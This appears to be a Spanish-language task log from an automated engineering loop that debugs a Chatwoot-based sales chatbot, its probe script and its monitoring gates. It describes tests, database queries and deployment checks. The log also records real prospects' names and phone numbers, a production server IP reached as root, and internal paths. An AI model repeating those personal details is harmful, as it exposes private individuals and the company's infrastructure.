      donde viven M5, M5_ACUSE y M8_SOPORTE). Probado que falla:
      `ONIA_BOT_CONFIG=/etc/hostname node scripts/sonda_widget.mjs --self-check` → *"el guardia del
      primer turno quedó ciego"*.
      **Verificado contra producción, no contra el test:** `node scripts/sonda_widget.mjs` →
      `exit 0`, y esta vez el texto que recibió el desconocido es el que corresponde —
      `#1 →` *"¡Hola! Soy el asistente automático de Onia. Sí, un bot. Y esto que estás viendo es
      justo lo que vendemos…"* (msg 316), `#2 →` *"Perfecto, anotado que te dedicás a odontología,
      que son 4 personas y que estás en Santa Cruz…"* (msg 318). La fila del motor terminó en
      `esperando_horario` con el embudo lleno **desde cero**: la prueba de que arrancó en frío.

- [x] 🔴 **La sonda reusa UNA conversación para siempre, así que desde la segunda vuelta ya no
      mide "un desconocido escribe dos veces": mide una charla con ocho turnos encima.**
      **CERRADO el 2026-09-02.** La causa medida no era la que este ítem suponía, y la diferencia
      importa: no es que la conversación "crezca" y confunda a la sonda por largo — es que llega a
      un estado donde **el bot calla POR DISEÑO**. Prueba, no hipótesis:
      `select bot_stage, human_took_over from onia_center.bot_conversations where
      conversation_key='chatwoot:49';` → **`handoff_humano|f`**. El motor lo silencia en
      `hermes-content/deploy/vps-ops/bot/bot-engine.mjs:459` y en el `case "handoff_humano"` de la 591, que es lo CORRECTO: el bot
      derivó a Sergio. La sonda gritaba "EL BOT SE QUEDO MUDO" con el bot sano — a las 20:19 y a
      las 21:09 del mismo día había contestado los dos turnos.
      **Ojo con la base equivocada:** en Chatwoot la conversación 49 figura `open` y perfectamente
      sana. El estado que calla vive en OTRA base (`onia_center.bot_conversations` del
      `supabase-db`). Mirar sólo Chatwoot es lo que mantuvo este bug invisible.
      **El arreglo — desarmar antes de medir**, con su caso en rojo primero
      (`necesitaDesarme is not defined`, 21/25) y verde después (25/25). No inventa un camino:
      usa el que el producto ya define — `clearHumanTakeover` (mismo archivo, línea 117) dice *"resolver significa terminé"* y
      devuelve `handoff_humano` a `nuevo`. Se resuelve **por Rails** para que corra el camino real
      (Chatwoot emite `conversation_status_changed` → el adapter lo traduce), así cada vuelta
      verifica de paso que ese desarme sigue vivo. Medido en vivo: `resolved` → **4 segundos** →
      `bot_stage=nuevo`.
      **Falla hacia el 2, nunca hacia el 1:** si el desarme no devuelve la conversación, la sonda
      dice "NO SE PUDO MEDIR", no "el bot está mudo". Confundir esas dos cosas es exactamente lo
      que costó esta vuelta.
      **Verificación final:** `node scripts/sonda_widget.mjs` → **exit 0**, *"EL BOT CONTESTO LOS 2
      — conversacion 49"*. Antes del arreglo, mismo comando: exit 1, 2 de 2 sin respuesta.
      ⚠️ **La corrección que este ítem proponía (resolver para que se abra una conversación NUEVA)
      no es lo que pasó:** medido, el widget siguió escribiendo en la **49**. Anotado para que nadie
      "arregle" después el hecho de que la conversación no se renueve.
      🔴 **Y "alcanza igual, porque lo que había que resetear era el estado del motor, no el hilo"
      era FALSO — lo desmintió la producción el 2026-09-03.** El desarme resetea `bot_stage` y
      **nada más**, así que el embudo sobrevive intacto. Los MISMOS dos mensajes, tres vueltas
      seguidas del loop, y las tres **exit 0 · "EL BOT CONTESTO LOS 2"**:
      **03:04** `#1 →` *"¡Hola! Soy el asistente automático de Onia. Sí, un bot."* ← lo que ve un
      desconocido · **04:03** `#1 →` *"¿Querés que te reserve para el viernes 4 de septiembre?"* ←
      ya le ofrece hora · **05:03** `#1 →` *"Eso lo tiene que ver Sergio, no yo"* (M5) ← lo deriva
      de una. La fila del motor a las 05:04:
      `qualification={"city":"Santa Cruz","industry":"dental","teamSize":4}`, dos `slots_offered`,
      `off_script_count=2`. El motor arrancaba cada vuelta con el embudo YA lleno.
      **`clearHumanTakeover` hace bien en no borrarlo** (`bot-engine.mjs:121`): para un lead de
      verdad, olvidarle el rubro sería el bug. Para la sonda es el veneno.
      **La sonda no lo podía ver porque CONTABA las respuestas sin LEERLAS** — el defecto escrito
      del carril ("un test que mira el primer paso no ve un sistema que muere en el segundo") una
      vuelta más adentro: **un test que cuenta no ve un sistema que contesta cualquier cosa.**
      Cerrado abajo, en el ítem del 2026-09-03.
      <!-- Diagnóstico original, conservado: llegó a la causa correcta a medias -->
      Medido hoy
      2026-09-02, no supuesto — y es un **falso rojo**, el peor defecto posible en el instrumento
      que decide si el carril está roto. Archivo: `scripts/sonda_widget.mjs`.
      **Reproducción exacta, 2 minutos:** `node scripts/sonda_widget.mjs` dos veces seguidas. La
      primera salió **0** (21:09:04 y 21:09:19, las dos contestadas: mensajes 264→265 y 266→267);
      la segunda, **40 segundos después**, salió **1** — mensaje **270** (21:09:59) sin respuesta
      **90 s después**, verificado en la base, no por timeout de la sonda:
      `docker exec <chatwoot-db> psql -U postgres -d onia-chatbot -tAc "select id, message_type,
      created_at, left(content,70) from messages where conversation_id=49 order by created_at;"`
      **Por qué NO es el bug del bot.** En esa tercera repetición el bot ya venía de contestar
      *"¿En qué horario te viene mejor…"* y *"Eso lo tiene que ver Sergio, no yo"*: la máquina de
      estados está a ocho turnos de la bienvenida. Ningún lead de verdad llega ahí en su segundo
      mensaje. La sonda está juzgando un estado conversacional que su propia definición de hecho
      no describe.
      **De dónde viene:** la conversación se reusa para esquivar el tope de 5 aperturas/hora, y esa
      decisión —correcta contra el 429— arrastró un efecto que nadie midió: la conversación **crece**
      y el estado del bot se va con ella.
      **El dato que hace barata la corrección, medido hoy:** el inbox 4 tiene
      `lock_to_single_conversation = f` (`select id, name, lock_to_single_conversation from
      inboxes where id in (4,5);` → `4|Onia Web|f`). O sea que **resolviendo** la conversación
      antes de medir, el próximo mensaje del widget abre una **nueva** — conversación fresca cada
      vuelta, sin tocar el throttle, porque el token se sigue firmando por Rails
      (`guionBootstrap`), que nunca pasa por `/widget`. Es un `update` de estado en el guión de
      Rails que ya existe, más su caso en rojo primero.
      ⚠️ **No confundir con "arrancar de cero cada vez":** un contacto nuevo por vuelta ensucia el
      inbox 4, que es donde viven los leads de verdad (ya pasó: 12 contactos anónimos el 2026-09-02).
      El contacto se reusa; lo que se renueva es la conversación.

- [x] **El chequeo de "hecho" de este carril funcionó UNA sola vez en su vida, y el arreglo
      anterior es el que lo garantizó.** Hecho el 2026-09-02. Archivo: `scripts/sonda_widget.mjs`.
      **Gate 1: el ítem era REAL y salió del propio chequeo de arranque**, no de la cola —
      `node scripts/sonda_widget.mjs` daba **exit 2**, `Timeout 30000ms … waiting for
      locator('#chat-input')`. La vuelta anterior había cerrado la sonda declarándola viva, y lo
      estaba: la conversación **49** existe con sus dos turnos contestados (mensajes 257-263,
      20:19-20:20). Midió una vez y no volvió a medir nunca.
      🔴 **Las dos causas, MIRADAS renderizadas con Chromium — ninguna era la que decía el error.**
      **(1) El botón cambia de rótulo.** Para esquivar el tope de 5 aperturas/hora la sonda entra
      con `cw_conversation` y **reusa su conversación** — y con conversación ya empezada Chatwoot
      rotula el botón **"Continuar conversación"**, no "Iniciar conversación", que era lo único que
      el localizador buscaba. O sea que el arreglo del 429 **se saboteó a sí mismo**: la primera
      vuelta (contacto recién creado, sin conversación) decía "Iniciar" y anduvo; **todas las
      siguientes decían "Continuar" y morían**. Es exactamente el modo de falla que este carril
      tiene escrito — *un chequeo que mira el primer paso no ve un sistema que muere en el segundo*—
      esta vez adentro del chequeo mismo.
      **(2) Y aun clickeando por rótulo correcto, no alcanzaba: no había a quién clickear todavía.**
      `goto` vuelve con `domcontentloaded` y en ese instante el Vue del widget **no dibujó nada**:
      `document.querySelectorAll('button')` devuelve **cero**. La sonda no clickeaba, esperaba 30 s
      una caja que no se iba a montar, y el mensaje de Playwright no decía ni una palabra de esto.
      Con 6 s de espera los dos botones están y el clic funciona.
      **Qué se construyó.** `elegirArranque()` —pura y exportada— elige el botón **por estructura y
      no por rótulo**: descarta el de cerrar y los sin texto, y entre los que quedan prefiere el que
      habla de la conversación. Sobrevive a "Continuar", a un cambio de idioma y al próximo cambio
      de copy. Más un bucle que **espera a que el widget monte** antes de mirarle los botones, y un
      diagnóstico que, si igual no aparece `#chat-input`, imprime **los botones y el texto de la
      pantalla**. Eso último no es adorno: esta misma falla costó una vuelta de diagnóstico a
      ciegas —se supuso un iframe que no existe, y después un rótulo que había cambiado— y el
      mensaje nuevo la resuelve en 5 segundos.
      **Rojo primero y por el motivo correcto.** Los 6 casos nuevos se corrieron contra la semántica
      vieja (la que estaba viva): **3 en rojo**, y el principal falló con **su propia** aserción —
      *"con «Continuar conversación» hay que clickear igual: es el mismo botón con otro rótulo"*.
      Los DOM de los casos son **reales**, leídos del widget de producción con Chromium: el de una
      vuelta cualquiera (`["…close-button", "Continuar conversación"]`) y el de la primerísima
      (`"Iniciar conversación"`). Los otros 3 son guardas: que no se arregle el caso 2 rompiendo el
      1, que **nunca** se clickee el botón de cerrar (cerraría el panel, con un síntoma idéntico al
      bug de hoy) y que la lista vacía dé -1 = *esperar*, no *no hay botón*.
      **Verificado en vivo, y verificado DOS veces a propósito** — que funcione una vez es
      justamente lo que ya pasaba: primera corrida **exit 0**, *"EL BOT CONTESTO LOS 2 —
      conversación 49"*; segunda corrida seguida, **midió otra vez** (dio 1, y ese 1 es el ítem
      abierto de arriba: la sonda mide, pero desde la vuelta 2 mide otra cosa).
      **Gates:** `npm test` completo en verde (exit 0), con `test:sonda-widget` **21/21**.

- [x] **El bot no dejaba NI UNA línea por mensaje, y por eso el bug de "contesta una vez y se
      calla" sobrevivió una semana con cinco personas reales del otro lado.** Hecho el 2026-09-02.
      Archivos: `hermes-content/deploy/vps-ops/bot/webhook-server.mjs` y
      `hermes-content/deploy/vps-ops/bot/webhook-server.test.mjs`.
      **Medido en vivo, no leído:** `/tmp/onia-bot-webhook.log` **dentro del contenedor
      `onia-center`** (en el host no existe: el bot corre con `docker exec -d`) tenía **2,5 MB y
      su última escritura era `2026-09-02T17:19:49Z`, la del arranque** — mientras la conversación
      **48** recibía mensajes a las 17:21:35 y 17:21:54. Cero líneas por webhook. La causa: el
      servidor **ya recibía** un `log`, pero sólo lo llamaba en dos errores raros (socket muerto y
      n8n); el camino del webhook no escribía nunca. **Un log que existe y no se llama es peor que
      no tenerlo, porque aparenta diagnóstico.**
      **Qué se construyó.** `formatearTraza()` (pura) + una `traza` que sale de **todas** las
      ramas de `handleChatwootWebhook`. Una línea por webhook con conversación, mensaje, entrada,
      etapa `antes->después`, el conteo de publicados sobre producidos y **el motivo**. Las tres ramas
      mudas se nombran distinto porque las tres devuelven 200 con cuerpos casi iguales y a ojo se
      leen como éxito: **`MUDO`** (el turno corrió y no produjo nada — el bug de la semana),
      **`NO_ENTREGADO`** (produjo respuesta y Chatwoot la rechazó — los cuatro días de agosto con
      `/health` en verde) e **`ignorado`**. Más `repetido`, `ERROR`, `rechazado` (auth: la rama que
      hay que ver cuando "no llegan los webhooks") y `respondio`.
      **La traza se arma envolviendo el pipeline, no en cada `return`.** Hay **nueve** salidas: la
      propiedad "todo webhook deja una línea" se rompe sola en cuanto alguien agregue la décima.
      Envolviendo, no hay forma de salir sin traza — y hay un test que lo exige en las ramas feliz,
      skip y auth.
      **Rojo primero y por el motivo correcto.** Los 7 casos nuevos se corrieron contra un stub que
      devolvía `""`, así que cada uno falló en **su propia** aserción, no por un error de módulo.
      **Y probado que MUERDE:** dos mutaciones, las dos rojas — `MUDO`→`respondio` (2 casos) y el
      servidor volviendo a **no** loguear, que es el estado de hoy en producción (1 caso).
      **Gates:** `npm run test:bot` **704/704** en verde (31 en este archivo, 7 nuevos).
      ✅ **DESPLEGADO — verificado el 2026-09-10 22:46 La Paz: el log ya NO está ciego.**
      `ssh root@187.77.16.63 'grep -c "trazaWebhook\|respondio\|MUDO" /opt/onia/bot/webhook-server.mjs'`
      → **5**. El texto anterior (*"hasta que alguien copie el archivo y reinicie el bot, el log
      sigue ciego"*) describía el estado del 02-sep, no el de hoy.

- [x] 🔴 **El arreglo que hoy hace que el bot conteste dos veces está VIVO en producción y NO
      está en el repo: un `rsync` desde Windows lo borra y el bug de la semana vuelve.**
      Hecho el 2026-09-02. Archivos: `hermes-content/deploy/vps-ops/bot/bot-engine.mjs`,
      `hermes-content/deploy/vps-ops/bot/config.mjs` y
      `hermes-content/deploy/vps-ops/bot/knowledge.test.mjs`.
      **Gate 1 corrido, y el ítem era REAL:** el `diff` normalizado daba **25** líneas en
      `bot-engine.mjs` y **12** en `config.mjs` al empezar la vuelta. Ahora los dos dan **0** —
      el mismo comando que lo probó es el que lo cierra.
      🔴 **Lo que encontró el test que faltaba: el bug estaba blindado por su propio test.**
      `knowledge.test.mjs:487` **exigía** `botStage === "handoff_humano"` con el mensaje *"queda a
      cargo de un humano, no esperando una elección imposible"* — y `handoff_humano` es la barrera
      que devuelve **cero** respuestas para siempre (`bot-engine.mjs`, `case "handoff_humano"`).
      O sea: el test verificaba que el mensaje de bienvenida fuera correcto **y exigía el estado
      que hace callar al bot**. Verde, y la conversación moría en el segundo mensaje. Copiar los
      dos archivos sin tocar esa línea habría dejado el gate en rojo y el arreglo pareciendo un
      error.
      **Rojo primero y por el motivo correcto.** El test nuevo —*"sin horarios el bot sigue vivo en
      el SEGUNDO mensaje"*— corrió **antes** del arreglo y falló con su propia aserción:
      `el bot NO puede quedarse mudo en el segundo mensaje`. No falló por un módulo ni por una
      importación: por la propiedad que importa. Encadena dos turnos con `DEFAULT_CONFIG` (los
      slots reales de producción, en "pendiente de definir"), que es la única forma de ver un
      sistema que muere en el segundo turno.
      **Y probado que MUERDE: dos mutaciones, las dos rojas.** `botStage` de vuelta a
      `handoff_humano` → **2** casos rojos (el nuevo y el corregido); `M0b_SIN_HORARIOS` borrado
      → **1** rojo, por el placeholder *"HORARIO A (pendiente de definir)"* llegándole al
      prospecto.
      **Gates:** `npm run test:bot` **705/705** en verde (1 caso nuevo, 1 aserción corregida).
      ⚠️ **`config.mjs` se dejó byte a byte igual a producción, orden de claves incluido**
      (`M0b_SIN_HORARIOS` **antes** de `M0b`, con los dos bloques de comentario apilados). Se
      probó al revés primero y el `diff` daba **14** líneas de puro orden: el chequeo del ítem
      habría seguido gritando con el arreglo ya versionado, que es exactamente el fantasma que
      esta cola mide. Un orden más lindo no vale un gate ambiguo.
      **Esto NO despliega nada**: producción ya tenía el arreglo — lo que faltaba era la copia
      versionada que impide que un `rsync` desde Windows lo borre. El sentido del ítem era el
      inverso al habitual: acá el repo iba **atrás** de producción.

- [x] **El objetivo del carril se daba por cumplido leyendo un párrafo del 31-ago, y las cuatro
      formas en que puede romperse devuelven 200 con la lista vacía.** Hecho el 2026-09-02,
      auditando los `[x]` (nivel 2 de la escalera: "Ahora" no tenía ítems sin empezar y los tres de
      "Después" no son promovibles). Archivos: `scripts/objetivo_visible.mjs` (nuevo), `package.json`.
      **Gate 1 primero, y el `[x]` auditado resultó CIERTO hoy** — el ítem *"CERRADO el 2026-08-31
      (novena vuelta): hay dos desconocidos en `/inbox` de producción"*. Medido por el camino real,
      no leído: sesión del dueño → `GET https://app.onia.com.bo/api/bandeja` → **200**,
      `sinCanal:false`, tres conversaciones — **#37 mariohassen (+59173021804)** y **#35 F
      (+59173232758)**, más la #11 de Sergio, que es nuestra. El objetivo del carril sigue vivo.
      🔴 **Lo que NO estaba, y es el ítem: nada lo comprobaba.** `inbox:tenencia`, construido la
      vuelta anterior, mide `clinic_settings.chatwootInboxId` — el **primer eslabón de cinco**.
      Entre esa columna y el ojo del dueño hay cuatro capas más, y **tres fallan mudas**, con un
      200 indistinguible del éxito: la org sin inbox (`200 {sinCanal:true}`), el token de Chatwoot
      del contenedor sin membresía en el inbox (`200 {conversaciones:[]}`), y `esDeInbox` filtrando
      todas las filas (igual). La capa del token no es hipotética: **esta misma cola la nombra**
      *"exactamente el fantasma que este carril mide"*, y se comprobó a mano UNA vez, el 31-ago.
      **Y la receta para volver a mirarlo vivía sólo en la prosa de ese ítem cerrado**
      (`generate_link` → `verify` → cookies con `@supabase/ssr`) — el mismo molde con el que **S16
      venció en silencio** y **S11 se comprobaba a mano**. Ahora es ejecutable.
      **Qué se construyó.** `npm run objetivo:visible` sale **0** si la bandeja del dueño trae al
      menos una conversación de alguien que no somos nosotros, **1** si el objetivo se rompió
      (nombrando cuál de las cuatro capas), **2** si no pudo medir. No hardcodea al dueño: le
      pregunta a la base **quién** tiene el inbox 5 y entra como esa persona, así que si la bandeja
      cambia de org el gate sigue midiendo al dueño real. Y no hardcodea a mariohassen: exige
      "≥1 que no somos nosotros", porque un gate que exige un nombre se muere el día que esa
      conversación se borra.
      **Probado que MUERDE, y ahí aparecieron cuatro casos que pasaban en falso.** Siete mutaciones
      al veredicto, las siete rojas (2 a 9 casos cada una). Las mutaciones destaparon que
      `codigo === 1` **no alcanzaba** para `sinCanal` ni para la lista vacía: apagando cualquiera de
      esas ramas el flujo cae igual en "SOLO NOSOTROS", que también es 1 — o sea que el caso pasaba
      con la rama rota. Se afirma el **diagnóstico**, no sólo el código: un rojo por el motivo
      equivocado manda a mirar el archivo equivocado. Lo mismo con el 502, que sin su rama caía en
      "200 sin array" y devolvía 2 igual. Y el caso del `\b` del regex estaba mal elegido:
      `"Prudencia"` no contiene `"prueba"`, así que pasaba con el regex aflojado — reemplazado por
      el apellido real **`Testa`**, que sí contiene `test`. **Un caso que no puede fallar no es un caso.**
      **Las cuatro salidas en vivo, contra producción:** real → **0**; host que no es el producto →
      **2**; contenedor de base inexistente → **2**; sin `@supabase/ssr` → **2**.
      ⚠️ **Sólo lectura, y con dos cuidados que no son adorno:** nunca abre una conversación (eso la
      marcaría como leída en el Chatwoot de gente real), y **nunca hace `signOut`** — el perfil del
      dueño es el mismo que usa Sergio y un signOut global lo sacaría de su propia sesión.
      **Gates:** `npm test` completo en verde, con `test:objetivo-visible` (30 casos) cableado a la
      cadena — verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
      existen y NO los corre nadie: test:objetivo-visible"* antes de cablearlo.

- [x] **La bandeja del objetivo ya se había dado vuelta sola una vez, y lo único que la vigilaba
      era un comando escrito en un párrafo.** Hecho el 2026-09-02, auditando los `[x]` (nivel 2 de
      la escalera: "Ahora" no tenía ítems y los tres de "Después" no son promovibles).
      Archivos: `scripts/inbox_tenencia.mjs` (nuevo), `package.json`.
      **Gate 1 primero, y el `[x]` auditado resultó CIERTO hoy:** `Onia (interna)` sigue con el
      inbox 5 — medido en `supabase-db`, no leído, con `updatedAt = 2026-09-02 05:09:11`, que es
      el `UPDATE` de la restauración (su commit `fc58f298` es de las 05:11:18). Nadie lo volvió a
      tocar. Pero ese ítem se cerró **declarando su propio agujero**: *"ningún gate de este carril
      mide hoy la tenencia del inbox 5… se deja escrito el comando de verificación para el próximo
      Gate 1"*. Un comando parado en un documento es el molde exacto con el que **S16 venció en
      silencio** y con el que **S11 se comprobaba a mano**. Ahora es ejecutable.
      **Qué se construyó.** `npm run inbox:tenencia` le pregunta a la base de producción quién es
      dueño de cada inbox de Chatwoot. Sale **0** si `Onia (interna)` tiene el 5, **1** si la
      tenencia se movió, **2** si no pudo medir (no medir no es estar bien). Importa más que los
      otros tres gates del carril: `espejo-check`, `campanas-vivas` y `marca-chatwoot` miden código
      y HTML público; **éste mide la única columna que decide si el objetivo se ve** — `/inbox`
      filtra por `clinic_settings.chatwootInboxId` y sólo por esa (`lib/chatbot/bandeja-auth.ts:22`).
      **Rojo por el motivo correcto, y contra bytes VIVOS.** Se leyó producción de verdad y a esa
      salida real se le aplicó el revert del 1-sep: sale 1, dice *"debería tener el inbox 5 y tiene
      el 4"* y agrega la pista forense que la propia cola manda mirar — el `id` de la fila es un
      UUID y no el `cuid()` que genera la app, o sea que se escribió **por fuera**.
      🔴 **El id UUID se reporta pero NO es el veredicto, y esa distinción es el ítem.** Hoy la fila
      **buena** también tiene id UUID (`ab6e629f-…`): la restauración fue un `UPDATE` sobre la fila
      que dejó el mecanismo desconocido, no una fila nueva. Un gate que se pusiera rojo por el
      formato del id estaría rojo para siempre con la tenencia correcta — el mismo modo de falla
      que `scripts/s11_desplegado.mjs` ya documenta.
      🔴 **Y apareció un segundo invariante que nadie había medido: la base NO impide que dos orgs
      se queden con el mismo inbox.** `chatwootInboxId` es `Int?` **sin `@unique`**
      (`prisma/schema.prisma:1002`), y `ClinicSettings` tampoco tiene `@@unique` sobre esa columna:
      el 409 que evita la colisión vive **sólo en la app**, en el PATCH de superadmin — y la
      escritura que rompió esto la primera vez no pasó por la app. Dos orgs sobre un inbox se ven
      las conversaciones entre sí. El gate lo detecta y lo nombra.
      **Gates:** `npm test` completo en verde, con `test:inbox-tenencia` (22 casos) cableado a la
      cadena — y verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
      existen y NO los corre nadie"* antes de cablearlo.

- [x] 🔴 **El chequeo de "hecho" de este carril no se podía ejecutar — y el diagnóstico escrito
      de por qué era FALSO.** Hecho el 2026-09-02. Archivos: `scripts/sonda_widget.mjs` (nuevo),
      `package.json`.
      **Gate 1 corrido, y el ítem era REAL**, pero su causa no era la anotada. Acá decía que el
      localizador expiraba *"probablemente dentro de un iframe, o montada recién al abrir el
      panel"*. Medido: **no hay iframe** (`page.frames().length === 1`) y el selector es
      `#chat-input` (el `ChatInputWrap` del widget, linea 139 — vive dentro del contenedor de Chatwoot, no en este repo). Lo que pasaba es
      que la página **nunca cargaba**: `GET /widget?website_token=…` devuelve **HTTP 429 `Retry
      later`**. La regla, textual, en el `rack_attack` de Chatwoot (initializer del contenedor, no de este repo):
      `throttle('widget?website_token=…', limit: 5, period: 1.hour)` `if req.path == '/widget' &&
      params['cw_conversation'].blank?`. **Abrir el widget sin traer conversación son 5 veces por
      hora y por IP.** Una sonda horaria que abre limpio se apaga sola y encima se come el cupo.
      La hipótesis del iframe no era sólo inútil: mandaba a arreglar el archivo equivocado.
      ⚠️ **Los leads reales NO están afectados, y se verificó en vez de suponerse.** El contador es
      por IP y Chatwoot ve la IP real de cada visitante: en su log conviven `181.115.161.191`,
      `189.28.94.168`, `181.188.170.59` (ISPs bolivianos) y `187.77.16.63`, que es este VPS. **El
      único bloqueado era el bloqueador: nosotros.**
      **La salida es `cw_conversation`.** `WidgetsController#set_token` decodifica ese parámetro,
      busca el `ContactInbox` por `source_id` y reusa el contacto — y el throttle **no aplica**
      cuando el parámetro viene. La sonda guarda su token la primera vez y después entra siempre
      por la puerta libre. Efecto de borde deseado: hay **una sola** conversación de sonda, no una
      por hora ensuciando la bandeja donde viven los leads de verdad.
      **`npm run sonda:widget`** sale **0** si el bot contestó los DOS mensajes, **1** si contestó
      uno o ninguno, **2** si no pudo medir. El `conversation_id` sale del `source_id` del propio
      token, **no** de "la conversación más nueva del inbox": adivinarla haría que la sonda juzgue
      la conversación de un lead de verdad.
      ⚠️ **El contacto se llama `Sonda QA carril chatbot` a propósito.** `scripts/objetivo_visible.mjs`
      excluye a los que somos nosotros con `/\b(prueba|qa|test)\b/i`; sin nombre, ese gate contaría
      a esta sonda como "un desconocido escribió" y **el carril se declararía cumplido por su
      propia sonda**. Hay un caso que lo afirma.
      🔴 **Los tres falsos verdes que encontró el veredicto, y que un conteo ingenuo no ve.**
      (1) Los `message_type = 3` son los enlatados del pre-chat: salen en el **mismo milisegundo**
      que el entrante y salen **siempre**, también con el bot mudo — contarlos pinta de verde
      exactamente el bug. (2) "Hubo 2 salientes" es verde con **dos respuestas al primer mensaje y
      cero al segundo**, que es literalmente el bug de la semana: se cuenta **por turno**. (3) Una
      respuesta tiene que venir después de **su** entrante y del más reciente, o una sola respuesta
      da por contestados dos mensajes seguidos.
      **Probado que MUERDE, y ahí aparecieron DOS casos que pasaban en falso.** Cuatro mutaciones;
      en la primera pasada **sólo dos** se pusieron rojas. Las otras dos —"la saliente contesta
      cualquier turno" y "juzgar el histórico entero"— sobrevivían porque los casos estaban mal
      construidos: el de la saliente huérfana la ponía **antes** del primer entrante, donde no hay
      turno abierto que ensuciar, y el del histórico ya venía rojo por otro motivo, así que el
      veredicto no cambiaba. Reemplazados por los dos que sí muerden (*una respuesta no alcanza
      para dos entrantes seguidos* y *un mudo de una vuelta vieja no deja el gate rojo para
      siempre*). Ahora las **cuatro** mutaciones caen, cada una en **su propia** aserción.
      **Un caso que no puede fallar no es un caso** — y el archivo tenía dos.
      **Gates:** `test:sonda-widget` (11 casos) cableado a `npm test`, verificado **en rojo
      primero**: `test:guards-cableados` mordió con *"estos tests existen y NO los corre nadie:
      test:sonda-widget"* antes de cablearlo.
      🔴 **La sonda mandó sus dos mensajes por primera vez el 2026-09-02 20:49 UTC, y el bot
      contestó los DOS.** Conversación **49**, leída en la base de producción: entrante *"Hola,
      quiero informacion sobre el sistema"* → `message_type=1`; entrante *"Tengo una clinica dental
      en Santa Cruz, somos 4 personas"* → `message_type=1` *"Perfecto, anotado que te dedicás a
      odontología, que son 4 personas…"*. **El bug de la semana no volvió**, y por primera vez eso
      está medido en vez de supuesto.

      **Esperar a la hora en punto era la salida equivocada, y estaba escrita acá.** Decía que el
      cupo se recompone solo al minuto 3. Es cierto y no alcanza: deja la única prueba del carril
      atada a que nadie haya corrido la sonda hace poco — una moneda, no un chequeo. La sonda ya
      **no abre `/widget` limpio nunca**: mintea su `cw_conversation` con el propio
      `Widget::TokenService` de Chatwoot vía `rails runner` (11 s medidos), y entra siempre por la
      puerta que `rack_attack` no cuenta. `guionBootstrap()` y `tokenDeSalida()` están exportadas y
      afirmadas: el token se saca **de entre** el ruido de WARN/INFO del runner, y si la marca no
      está **explota** en vez de guardar una línea de log como si fuera un token.
      Efecto de borde: el contacto se crea **ya nombrado** `Sonda QA carril chatbot`. Antes el
      nombre se ponía por SQL al final, sólo si la vuelta llegaba viva hasta ahí, y **cada arranque
      fallido dejaba un contacto anónimo en el inbox 4**, el de los leads de verdad — había 12 del
      2026-09-02 (`misty-leaf-844`, `lingering-water-811`…). Verificado que **no contaminan el
      objetivo**: los 395 contactos sin conversación del inbox 4 no los cuenta `objetivo:visible`,
      que cuenta conversaciones; sigue diciendo 2 desconocidos (#37 mariohassen, #35 F).

      Se cayeron dos hipótesis escritas, las dos por MIRAR la pantalla renderizada:
      - **El widget no abre en la caja de texto.** Abre en una pantalla cuyo único `<button>` dice
        **"Iniciar conversación"**; `#chat-input` recién se monta al tocarlo. Por eso expiraba el
        localizador. Ni el iframe ni *"esperar a que monte el panel"* — lo que faltaba era **un
        clic**. Con el clic la sonda mandó los dos mensajes.
      - **El nombre corto del contenedor no existe.** En Swarm es
        `onia-chatbot_chatwoot-db.1.nhgizxt2v01…`, con sufijo de réplica que cambia en cada
        redeploy: `docker exec onia-chatbot_chatwoot-db` daba `No such container` **después** de
        mandar los mensajes, o sea gastaba la medición para no medir nada. Ahora los dos
        contenedores se resuelven por prefijo con `docker ps --filter`.

      🔴 **Lo único que queda, con su reproducción exacta:** correr `npm run sonda:widget` **una
      segunda vez**, con la conversación 49 ya existente, vuelve a salir **2** con
      *"waiting for locator('#chat-input')"*. La primera corrida (sin conversación) sí pasa. La
      hipótesis —**no verificada, no la anuncies sin mirarla**— es que con conversación previa el
      widget ya no muestra "Iniciar conversación" y monta otra pantalla. Se reproduce en 30 s:
      abrir la URL del widget con el `cw_conversation` de `/root/.onia/sonda-widget.json`,
      `document.body.innerText` y la lista de `<button>`. **Mirarla antes de tocar el selector.**

✅ **"Ahora" tiene combustible, y las dos veces salió de MIRAR el sistema vivo, no de la cola**: el
`bot-engine` sin versionar salió de comparar el repo contra producción, y la sonda rota salió de
intentar correr el chequeo de "hecho". Lo de abajo describe la
vuelta anterior, cuando el carril sí estaba vacío, y explica por qué mirar el sistema vivo es lo
que lo destraba.

⚠️ **"Ahora" seguía sin ítems sin empezar: el carril estaba sin combustible.** Los tres de "Después"
no son promovibles y no es trámite — el del disco es de la máquina Windows de Sergio y el propio
ítem dice que no lo arregla este carril; la data QA es un "no borrar todavía" deliberado; el QR
espera al banco (**S2**). Las 14 filas de "Bloqueado en Sergio" esperan a Sergio, y las que una
máquina puede medir ya se miden solas. Lo que destraba el carril es **S14** (darle org al inbox 4:
hay seis conversaciones de desconocidos que nadie puede abrir, cinco sin teléfono ni correo) y
**S12** (los dos horarios de demo, sin los cuales el bot contesta una vez y se calla). Los dos son
decisión de Sergio, no código.

> Los tres de "Después" siguen sin subir, y no es trámite: ninguno está frenado por código. El
> disco es de la máquina Windows de Sergio y el ítem mismo dice que no lo arregla este carril —
> medido en el VPS, que es donde corre este loop: 72 % de uso, 56 GB libres y **2** worktrees
> de `onia-platform`, no 30. La data QA es "no borrar todavía". El QR espera al banco (**S2**).

---

- [x] ✅ **RESUELTO el 2026-09-02 — el bot contesta el segundo mensaje.** La causa se sacó
      corriendo el motor contra el caso, no leyendo código: `MSG1 → stage handoff_humano, notes
      ["bienvenida","sin_horarios_que_ofrecer"]` · `MSG2 → replies 0, notes
      ["silencio:handoff_en_curso"]`. Sin Cal.com instalado, los slots de `hermes-content/deploy/vps-ops/bot/config.mjs` siguen en
      *"HORARIO A (pendiente de definir)"*, así que `slotsPending` es SIEMPRE true y
      `welcomeResult` mandaba **toda** conversación a `handoff_humano` — que es silencio
      permanente. Y no había humano.
      **Lo más caro fue el test que lo protegía:** `hermes-content/deploy/vps-ops/bot/knowledge.test.mjs` verificaba que el mensaje
      de bienvenida fuera correcto y **exigía `handoff_humano`**. Verde, y la conversación moría.
      Un test que mira el primer mensaje no puede ver un bot que enmudece en el segundo.
      **Arreglado:** `esperando_horario` (la rama viva) + `M0b_SIN_HORARIOS`, que acusa el dato y
      pide el contacto en vez de re-ofrecer un horario que no existe. 689 tests verdes, test nuevo
      que falla en rojo antes. Desplegado a `/opt/onia/bot` y **verificado en el widget real**.
      ⏭️ **Queda lo otro, y es de Sergio:** definir los dos horarios o instalar Cal.com (tablero
      `t_af8f44ad`).

